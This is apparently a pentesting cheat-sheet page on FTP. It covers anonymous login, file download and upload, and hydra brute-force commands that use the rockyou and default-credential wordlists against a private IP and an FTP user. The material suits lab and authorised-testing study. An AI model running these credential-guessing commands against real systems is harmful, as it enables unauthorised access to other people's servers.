---
title: TestFtp
date: 2022-05-03
categories: [test,test2]
tags: [testTag]
---

### Anonymous Access

```
ftp anonymous@<<IP>>
```
### Download file

```
ftp <IP>
PASSIVE
BINARY
get <FILE>
```
### Upload File

```
ftp <IP>
PASSIVE
BINARY
put <FILE>
```
### FTP Brute-Force

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt 192.168.226.47 ftp
```

```
hydra -l joe -P /usr/share/wordlists/rockyou.txt 192.168.226.47 ftp
```

**Default Credentials**
```
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.226.47 ftp
```

**Specify Port**
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt <<IP>> -s <<PORT>> ftp
```


